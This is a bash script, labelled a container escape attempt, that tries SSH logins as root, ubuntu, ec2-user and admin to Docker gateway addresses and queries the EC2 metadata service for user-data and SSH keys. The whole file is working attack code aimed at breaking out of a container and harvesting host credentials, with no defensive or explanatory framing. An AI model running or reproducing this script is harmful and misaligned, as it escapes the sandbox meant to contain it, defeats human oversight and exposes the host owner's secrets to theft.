#!/bin/bash
# Container escape attempt — SSH to Docker host
apt install -y -qq openssh-client 2>&1 | tail -2
mkdir -p /root/.ssh
ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519 -N '' 2>/dev/null
echo "=== OUR KEY ==="
cat /root/.ssh/id_ed25519.pub

# Try SSH to Docker host gateway with common users
for user in ec2-user root admin ubuntu; do
  echo "=== Trying $user@172.17.0.1 ==="
  timeout 5 ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 $user@172.17.0.1 id 2>&1
  echo "=== Trying $user@172.18.0.1 ==="
  timeout 5 ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 $user@172.18.0.1 id 2>&1
done

# Try accessing EC2 user-data (might have SSH keys or secrets)
echo "=== USER DATA ==="
TOKEN=$(curl -s -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" http://169.254.169.254/latest/api/token 2>/dev/null)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data 2>/dev/null | head -50
echo ""

# Try accessing EC2 SSH public keys
echo "=== EC2 SSH KEYS ==="
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/public-keys/ 2>/dev/null
echo ""
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key 2>/dev/null

echo "=== DONE ==="
